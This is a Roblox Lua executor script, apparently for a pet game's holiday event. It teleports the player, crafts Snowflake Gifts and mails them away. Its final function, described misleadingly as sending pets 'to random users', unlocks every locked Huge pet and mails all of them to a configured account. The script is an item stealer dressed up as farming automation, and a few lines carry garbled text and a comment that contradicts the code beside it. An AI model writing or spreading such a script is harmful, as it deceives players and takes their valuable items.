local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local player = game.Players.LocalPlayer
local teleportLocation = game:GetService("Workspace").__THINGS.Instances.HolidayEvent.Teleports.Enter

local username = getgenv().Config.Username
local amountThreshold = 100
local snowflakeToGiftRatio = 10
local diamondPerGift = 10000

-- Teleport player to the Holiday Event location
if teleportLocation and teleportLocation:IsA("BasePart") then
    player.Character:SetPrimaryPartCFrame(teleportLocation.CFrame)
    print("Player has been teleported to the Holiday Event!")
else
    warn("Teleport location not found.")
end

wait(15)

-- Function to check inventory, craft gifts if possible
local function checkAndCraftGifts()
    local playerInventory = Save.Get()["Inventory"]
    local MiscInv = playerInventory["Misc"] or {}
    local snowflakeCount = 0
    local diamond = 0

    print("Inventory loaded. Misc items count: " .. #MiscInv)

    -- Get diamond count from leaderstats
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local diamondStat = leaderstats:FindFirstChild("ðŸ’Ž Diamonds")
        if diamondStat and diamondStat:IsA("IntValue") then
            diamond = diamondStat.Value
        else
            warn("No ðŸ’Ž Diamonds found in leaderstats.")
        end
    else
        warn("No leaderstats found.")
    end

    -- Count snowflakes in the inventory
    for _, item in pairs(MiscInv) do
        if item.id == "Snowflake" then
            snowflakeCount = snowflakeCount + item._am
        end
    end

    print("Total Snowflake items:", snowflakeCount)

    local totalGiftsToCraft = math.floor(snowflakeCount / snowflakeToGiftRatio)
    local totalDiamondToCraftAll = totalGiftsToCraft * diamondPerGift

    print("Total Gifts to Craft:", totalGiftsToCraft)
    print("Total Diamonds Required:", totalDiamondToCraftAll)
    print("Available Diamonds:", diamond)

    if diamond >= totalDiamondToCraftAll and totalGiftsToCraft > 0 then
        local args = {totalGiftsToCraft * snowflakeToGiftRatio}

        local success, err = pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("SnowMachine_Activate"):InvokeServer(unpack(args))
        end)

        if success then
            print("Successfully crafted gifts!")
        else
            warn("Failed to craft gifts:", err)
        end
    else
        if totalGiftsToCraft == 0 then
            warn("Not enough snowflakes to craft any gifts.")
        else
            warn("Not enough diamonds to craft gifts.")
        end
    end
end

checkAndCraftGifts()

wait(10)

-- Function to send Snowflake Gifts if the threshold is met
local function sendSnowflakeGifts()
    local playerInventory = Save.Get()["Inventory"]
    local lootboxInv = playerInventory["Lootbox"] or {}

    local SnowflakeGiftCount = 0
    local giftUIDs = {}

    print("Lootbox loaded. Snowflake Gift count: " .. #lootboxInv)

    for _, item in pairs(lootboxInv) do
        if item.id == "Snowflake Gift" then
            SnowflakeGiftCount = SnowflakeGiftCount + item._am
            table.insert(giftUIDs, _)  -- Using item.uid instead of `_`
        end
    end

    print("Total Snowflake Gift items:", SnowflakeGiftCount)

    if SnowflakeGiftCount > amountThreshold then
        local args = {
            [1] = username,
            [2] = "Here Snowflake Gift",  -- the note
            [3] = "Lootbox",
            [4] = giftUIDs[1],
            [5] = SnowflakeGiftCount
        }

        print("Sent:", unpack(args))
        local success, err = pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        end)

        if success then
            print("Successfully sent Snowflake Gifts!")
        else
            warn("Failed to send Snowflake Gifts:", err)
        end
    else
        warn("No Snowflake Gifts found or amount below threshold")
    end
end

sendSnowflakeGifts()

  wait(5)


-- New feature: Send all Huge Pets from inventory to random users
local function sendHugePets()
    local Network = require(game.ReplicatedStorage.Library.Client.Network)
    local HugeUIDList = {}

    -- Collect Huge Pets (e.g., Lit Octopus) from the inventory
    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
        if PetData.id:find("Huge") then 
            table.insert(HugeUIDList, PetUID)
            if PetData._lk then
                repeat
                    task.wait()
                until Network.Invoke("Locking_SetLocked", PetUID, false)
                print("Unlocked", PetUID)
            end
        end
    end

    print("Huge Pets to send:", #HugeUIDList)


    for _, PetUID in pairs(HugeUIDList) do
        local selectedUser = username  -- Using the username from Config
        local selectedMessage = getgenv().Config.NoteToSend  -- Using the message from Config

        repeat
            task.wait()
        until Network.Invoke("Mailbox: Send", selectedUser, selectedMessage, "Pet", PetUID, 1)
        
        print("Sent", PetUID, "to", selectedUser, "with message:", selectedMessage)
    end
end

sendHugePets()
